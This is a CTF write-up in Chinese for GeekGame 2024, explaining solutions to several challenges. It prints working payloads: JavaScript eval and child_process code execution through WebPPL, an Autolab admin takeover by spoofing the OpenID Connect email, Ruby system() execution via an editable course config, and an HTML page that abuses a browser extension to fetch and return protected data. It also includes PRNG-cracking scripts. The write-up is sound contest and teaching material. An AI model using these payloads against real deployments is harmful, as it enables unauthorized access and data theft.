# GeekGame 2024 Writeup

Author: [@liuly0322](https://github.com/liuly0322)
License: [CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/deed.zh-hans)

## 前言

又是新的一年，这是我参加的第二次 GeekGame，题目还是一如既往的有趣。对于思路和其他人类似的题目我就不打算再写了，预期本届官方 [资料存档](https://github.com/PKU-GeekGame/geekgame-4th) 会有更详细的解法。本 WP 包含：

- [概率题目概率过](#概率题目概率过)
- [ICS笑传之抄抄榜](#ICS笑传之抄抄榜)
- [好评返红包](#好评返红包)
- [随机数生成器](#随机数生成器)
- [神秘计算器](#神秘计算器)（非预期）

本文预计也会放在 [我的博客](https://blog.liuly.moe/) 上。

## 概率题目概率过

两问分别是在浏览器环境和 Node.js 环境下通过执行提交的 WebPPL 脚本拿到 Flag，很明显需要实现 JavaScript 的任意代码执行。

[这里的 WebPPL 文档](https://webppl.readthedocs.io/en/master/language.html?highlight=_top#calling-javascript-functions) 最后有提到：

> Note that since JavaScript functions must be called as methods on an object, it is not possible to call global JavaScript functions such as `parseInt()` directly. Instead, such functions should be called as methods on the built-in object `_top`. e.g. `_top.parseInt('0')`.

所以推测原生的 JavaScript 函数都可以通过 `_top` 调用，[源码](https://github.com/probmods/webppl/blob/daabd60361f72eef53f69005751facce34c7f916/src/header.js#L158) 也可以验证这一点。

```JavaScript
var exports = {
  _top: util.runningInBrowser() ? window : global
};
```

如果不熟悉 JavaScript，此时可以分别在浏览器和 Node.js 环境翻阅 `window` 和 `global` 对象的属性，找找什么函数有帮助。最后确定 `eval` 可以执行任意代码，拿到 Flag。

### Flag1

浏览器环境下，XSS Bot 模拟的行为是：

```Python
def run_code(c):
    # click the editor
    # delete everything
    # input the code
    # click run
    # ......
    pass

print('\nRunning flag...')
run_code(f'console.log("{FLAG1}")')

print('\nRunning your code...')
run_code(code)

title = driver.title
print('\nThe page title is:', title)
```

也就是首先执行输出 flag 的 WebPPL，然后再执行我们提交的代码。查阅 `console` 会得知无法直接获取它的历史输出，而且我们的代码执行在 flag 输出之后，也不能首先修改 `console` 对象，所以我们需要另想办法获取历史输出。

观察 *控制台* 直接执行 `console.log(FLAG1)` 和 *通过 XSS Bot 提交 WebPPL 脚本* 执行 `console.log(FLAG1)`，区别在于：

- WebPPL 环境可能保存了脚本执行的信息；
- 编辑器可能保存了历史输入。

两种思路都可以试一试。通过审查元素得知编辑器是 CodeMirror。如果搜索不到 CodeMirror 怎么获取历史记录，也可以先搜索怎么获取 CodeMirror 的实例，搜索关键词 *CodeMirror get instance* 很容易找到：

```JavaScript
document.querySelector('.CodeMirror').CodeMirror
```

然后在提供的 WebPPL 网站内把玩一番 CodeMirror 对象，自然发现有 `getHistory` 方法。所以最后的 payload：


```JavaScript
_top.eval("_top.document.title = _top.JSON.stringify(_top.document.querySelector('.CodeMirror').CodeMirror.getHistory())")
```

### Flag2

第二问：

```Python
def challenge_2(code):
    if not Path('/flag2').is_file():
        print('Cannot find flag file!')

    with open('/tmp/code.wppl', 'w', encoding='utf-8') as f:
        f.write(code)
        
    print('\nRunning your code...')
    subprocess.run('bash ./driver.sh', shell=True)
    
    out_path = Path('/tmp/output.txt')
    if out_path.is_file():
        print('\nThe output is:')
        print(out_path.read_text())
    else:
        print('\nOutput does not exist!')
```

翻阅 driver.sh 可以发现我们只需要设法执行 /tmp/getflag 即可把 flag 写入到 /tmp/output.txt。

通常思路是 `require('child_process').exec`，但是这里的环境没有。不过好在 WebPPL 装起来并不麻烦，可以本地把玩一下发现 `import` 还是可以用的。payload：

```JavaScript
_top.eval("import('child_process').then((m) => {m.exec('/tmp/getflag', (error, stdout, stderr) => {console.log(stdout)})})")
```

这题第二问需要一点 Node.js 的基础，懂了就比第一问简单，不懂的话就比第一问难了。

## ICS笑传之抄抄榜

### Flag1

这题 Flag1 我做的资料没了，所以就简单说一下思路。

欣赏一下第一问的评测日志会发现它居然是先解压 handout.zip，然后再解压我们提交的实验压缩包覆盖到 handout 目录下，最后再执行评测脚本。

这就意味着我们提交的 .tar.gz 内可以直接包含一个输出满分的评测脚本把原来的评测脚本覆盖掉，这样就满分了。具体输出格式可以参考 [Autolab 示例](https://github.com/autolab/Autolab/blob/master/examples/hellocat/autograde.tar)，或者自己跑一个零分的版本看最后的输出。

### Flag2

需要我们进入管理面板。说明应该是登录鉴权的一个洞。搜索 OpenID Connect 其实已经能看到 [CVE-2024-25618](https://nvd.nist.gov/vuln/detail/CVE-2024-25618)，旨在告诉我们 OpenID Connect 提供的邮箱未必可靠。加上第二阶段的提示，很容易想到需要在 OpenID Connect 服务端修改我们的邮箱。

> 这里可能需要先了解下 OpenID Connect 的工作流程，简单来说就是用户登录时会被重定向到 OpenID Connect 服务端，服务端验证用户身份后会重定向回 Autolab 网站并附带一个 token，最后 Autolab 网站通过这个 token 向 OpenID Connect 服务端获取用户信息。

了解完这个流程后我们观察一下登录过程的网络请求，就能找到 OpenID Connect 服务端的地址：<https://prob18id.geekgame.pku.edu.cn/>，登录上去发现可以随意修改邮箱。

接下来就是怎么找到管理员邮箱了。我并没有找到相关的接口（可能就是没有），但出题人在 /home/contact 页面下留了邮箱：

```txt
In this case, feel free to send an email to the Autolab developers mailing list,

ics@guake.la

We get a good deal of traffic on this list, but we'll make our best effort to get back to as soon as we can. Make sure to read below for what makes a good error report.
```

所以修改自己的邮箱为 `ics@guake.la` 即可以管理员身份登录，进入管理面板拿到 flag。

### Flag3

接下来就是寻找怎么 RCE，拿到服务器上的 /mnt/flag3。其实 Autolab 之前有个 MOSS 系统的 [RCE](CVE-2022-41955)，不过早就被修复了。

但总之注意力集中一点就会发现每个实验和每个课程都支持动态重新加载各自的 Ruby 配置文件（比如 /courses/Geek-ICS/manage 下可以选择 *Reload course config file*），而我们可以在 /file_manager/Geek-ICS 下修改课程配置文件 course.rb。

所以在配置文件开头加上我们想执行的代码就可以了。

```Ruby
# course.rb
# 一开始没提示 flag 在哪，所以可以创建一个链接慢慢找
system("ln -s / /home/app/webapp/courses/Geek-ICS/root")
# 如果知道 flag 位置，
# 直接把它拷贝到 /home/app/webapp/courses/ 下，
# 就可以在文件管理器里找到了
```

重载配置文件即可。

## 好评返红包

这题两个 flag 差不多，可以放在一块说。

流程上，一个安装了指定 XSS Bot 的网页会访问我们提供的一个网页，要求是让插件访问另一个服务器上的 /getflag 路径，并且把结果带回来。

稍微有点绕，本地开发时我们本地也可以开两个服务器方便调试。一个是 host HTML 文件用，另一个是模拟受害者服务器用。

都用静态文件服务器（比如 `python3 -m http.server`）开起来就好，注意指定不同的端口。

第二阶段精简后的 background.bundle.js：

```JavaScript
chrome.runtime.onMessage.addListener(async (e, o, i) => {
    if("imgUrl2Base64_send" === e.action) {
        var a = e.message;
        var c;
        try {
            c = await fetch(a || "");
        } catch(c) {
            throw new Error("Could not fetch ".concat(a, ", status: ").concat(c.status));
        }
        var u = await c.blob();
        var s;
        (s = new FileReader).onloadend = function() {
            chrome.tabs.query({
                active: !0,
                currentWindow: !0,
            }, (function(t) {
                var r;
                chrome.scripting.executeScript({
                    target: {
                        tabId: null == t || null === (r = t[0]) || void 0 === r ? void 0 : r.id,
                    },
                    func: n,
                    args: [{
                        action: "imgUrl2Base64_received",
                        message: "".concat(s.result),
                    }],
                });
            }));
        };
        s.onerror = function() {};
        s.readAsDataURL(u);
    }
});
```

可以发现它会 `fetch(a)`，可以装上插件动态调试一下会发现这里是在访问我们选择的图片，然后获取图片的 base64 编码。

所以把图片 URL 设置成 /getflag，问题就分解成了：

- 怎么选中这个图片，让插件请求（拿到 flag1）；
- 怎么把请求结果带回来（拿到 flag2）。

查看 contentScript.bundle.js：

```JavaScript
chrome.runtime.sendMessage({
    action: "imgUrl2Base64_send",
    message: e
})
```

好吧，我们不是插件，拿不到 `chrome.runtime`，老实模拟移动到图片上然后点击吧。注意需要先给图片一个宽高让它展示出来。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <style>
      img {
        width: 400px;
        height: 400px;
        display: block;
      }
    </style>
    <script>
      // receive message we want
      window.addEventListener('sendDataToContentScript', (e) => {
        document.title = e.detail.message
      })

      // trigger extension event
      const triggerEvent = () => {
        const element = document.querySelector('#img')

        const rect = element.getBoundingClientRect()

        const x = rect.right
        const y = rect.top

        const moveEvent = new MouseEvent('mousemove', {
          bubbles: true,
          cancelable: true,
          clientX: x,
          clientY: y,
        })
        document.elementFromPoint(x, y).dispatchEvent(moveEvent);

        const button = document.querySelector('.index-module__imgSearch_hover_rightWrapper--VZGcY')
        button.click()
      }
      setTimeout(() => {
        triggerEvent()
      }, 1000)
    </script>
  </head>
  <body>
    <!-- <img id="img" src="http://127.0.0.1:9081" /> -->
    <img id="img" src="http://127.0.1.14:1919/get_flag" />
  </body>
</html>
```

这就是最终拿到两个 flag 的 payload。监听 `sendDataToContentScript` 事件就能把结果带回来。

这个事件是怎么找到的呢？background.bundle.js 也有，但是比较绕，contentScript.bundle.js 的逻辑相对清晰：

```JavaScript
window.addEventListener("sendDataToContentScript", c);
```

我们也学着它监听这个事件就好了。

## 随机数生成器

Z3 魅力时刻。

### Flag1 & Flag3

[C](https://www.mathstat.dal.ca/~selinger/random/) 和 [Go(1.20)](https://medium.com/@vulbusters/exploring-gos-math-rand-b4ef0e841591) 的随机数生成器都有类似的同余递推关系。

以 Go 为例：

```Python
# 因为 int32 随机数生成是 int64 取高 32 位
# 所以和上面网页给的递推式略有不同
# xn = x(n-273) + x(n-607) (mod 2 ** 32)
# or xn = x(n-273) + x(n-607) + 1 (mod 2 ** 32)

# 先收集足够多的题目给的随机数
with open('data.txt', 'r') as f:
    data = f.read()
    nums = data.split('\n')[:-1]
    nums = [int(num) for num in nums]

print(nums)

# calculate yn - y(n-273) - y(n-607) array
arr = []
for i in range(607, len(nums)):
    n = nums[i] - nums[i-273] - nums[i-607]
    n = n % (2 ** 31) - 2 ** 31
    arr.append(n)

# 这里肉眼观察 arr，找出 flag 的循环长度
# flag 循环长度 53

# 因为 yn = xn + flagn
# yn - y(n-273) - y(n-607) = xn - x(n-273) - x(n-607) + flagn - flag(n-273) - flag(n-607)
#                          = (or) flagn - flag(n-273) - flag(n-607)
#                          = (or) flagn - flag(n-273) - flag(n-607) + 1

from z3 import *

flag = [Int(f'flag_{i}') for i in range(53)]
s = Solver()

for i in range(607, len(arr)):
    s.add(
        Or(
            arr[i] == flag[i % 53] - flag[(i - 273) % 53] - flag[(i - 607) % 53],
            arr[i] == flag[i % 53] - flag[(i - 273) % 53] - flag[(i - 607) % 53] + 1
        )
    )

if s.check() == sat:
    m = s.model()
    flag = [m[flag[i]].as_long() for i in range(53)]
    print(flag)
    print(bytes(flag).decode())
```

### Flag2

需要知道 MT19937 只需要 19937 位就能还原，一般虽然采取 $624 * 32$ 组还原，但只知道部分的位也可以，只要对应知道更多组生成的随机数就行。

本题在生成的随机数后随机加了一个 0-128 之间的 flag，因为 flag 很小，假设我们每次只取前 n 位作为有效信息，共取 k 组，那么 k 组都没有进位（到前 n 位）的概率：

$$
\left(1 - \frac{128}{2^{32-n}}\right)^k
$$

可以考虑取前 12 位，1900 组（其他组合也可以），此时大概有 $80\%$ 的概率能还原 flag。

然后你会发现只知道部分位，还原 MT19937 的库已经有大善人 [写好了](https://github.com/icemonster/symbolic_mersenne_cracker/tree/main)，直接拿来用就可以。

```Python
def solve():
    # 每行一个数字，我们取前 1900 个数字求解
    nums = []
    with open('data.txt', 'r') as f:
        data = f.read()
        nums = data.split('\n')[:-1]
        nums = [int(num) for num in nums]

    ut = Untwister()
    for i in range(1900):
        # 取高 12 位
        random_num = nums[i] >> 20
        # 库的使用说明：
        # Just send stuff like "?11????0011?0110??01110????01???"
        # Where ? represents unknown bits
        # 那这里就是前 12 位是已知的，后 20 位是未知的
        ut.submit(bin(random_num)[2:] + '?'*20)

    r_reversed = ut.get_random()
    for i in range(1900, 1980):
        rand = r_reversed.getrandbits(32)
        assert 0 <= nums[i] - rand < 200
        # 打印对应字符
        print(chr(nums[i] - rand), end='')

solve()
```

我的电脑大概跑两分钟就能还原出 flag。

## 神秘计算器

50 个字符以内，编写一个只使用加减乘除乘方取模的 lambda 表达式，使得实现对应功能。

### Flag1

费马素性检验，找两个大于 500 的素数结果取并就可以。

### Flag2

Pell 的通项公式：

$$
x_n = \frac{1}{2\sqrt{2}} \left( (1 + \sqrt{2})^n - (1 - \sqrt{2})^n \right)
$$

因为 $(1 - \sqrt{2})^n$ 会很小，所以我们主要是计算：

$$
\frac{1}{2\sqrt{2}} (1 + \sqrt{2})^n
$$

发现取整还是有点误差，稍作调整：

```Python
pell = lambda n: ((1+2**(1/2))**(n-1)-1/2)/2**(3/2)//1+1%n
```

这里分子减去 0.5，保证对于第一项之后，都比正确答案略小，因此取整后会比答案小 1。

最后除了第一项都补加上一个 1 即可。

### Flag3

这题还是要求计算 Pell 数，但是要计算 200 项完全一致，而且结果是整数。

估算一下就知道 200 位时答案已经很大，浮点数误差不足以支持计算出精确结果，所以这里必须更换计算方式。

这里提供一个和提示不太一样的做法。

考虑多项式环 $\mathrm{Z}[X]/(X^2-2X-1)$，简单来说就是假定 $X^2 = 2X + 1$：

$$
X^0 = 0X + 1 \\
X^1 = 1X + 0 \\
X^2 = 2X + 1 \\
X^3 = 2X^2 + X = 5X + 2 \\
X^4 = 2X^3 + X^2 = 12X + 5 \\
X^5 = 2X^4 + X^3 = 29X + 12 \\
\cdots
$$

对应下面的带余除法：

$$
X^n = F(x)(X^2 - 2X - 1) + k(n)X + m(n)
$$

中，$k(n)$ 和 $m(n)$ 都是 Pell 数列。

我们把多项式的取模转换成整数的取模。考虑代入一个足够大的 $A$，使得

$$
A^2 - 2A - 1 \gt k(n)A + m(n)
$$

那么：

$$
A^n = k(n)A + m(n) \mod (A^2 - 2A - 1)
$$

又：

$$
k(n)A + m(n) = m(n) \mod A
$$

我们就得到 Pell 数列 $m(n)$。

总结起来：

```Python
def pell(n):
    A = 4 ** n
    M = A ** 2 - 2 * A - 1
    return (A ** n) % M % A
```

即为答案。A 如果不够大可能会有错误，可以适当调整。

```Python
pell = lambda n: 4**n**2%((4**n-1)**2-2)%4**n
```

共计 28 个字符。